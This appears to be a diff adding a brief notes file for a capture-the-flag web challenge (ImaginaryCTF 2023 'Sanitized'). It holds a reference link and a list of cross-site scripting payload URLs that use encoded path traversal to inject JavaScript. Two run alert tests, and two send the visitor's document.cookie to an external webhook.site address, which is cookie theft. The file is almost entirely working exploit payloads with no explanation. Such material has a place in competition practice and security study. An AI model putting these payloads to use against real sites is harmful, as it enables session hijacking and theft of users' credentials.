@@ -1,0 +1,8 @@
+# Refrence
+https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Sanitized
+
+# Payload
+http://localhost:39046/a/g;alert(1)//a%2f..%2f..%2f..%2findex.html
+http://localhost:39046/a/g;eval('alert(1)')//a%2f..%2f..%2f..%2findex.html
+http://localhost:39046/a/g;location=decodeURIComponent('https%3A%2F%2Fwebhook.site%2F94347dd2-4cb2-480c-9926-2e57b404b571%3F'+document.cookie)//a%2f..%2f..%2f..%2f..%2f..%2findex.html
+http://app:3000/a/g;location=decodeURIComponent('https%3A%2F%2Fwebhook.site%2F94347dd2-4cb2-480c-9926-2e57b404b571%3F'+document.cookie)//a%2f..%2f..%2f..%2f..%2f..%2findex.html
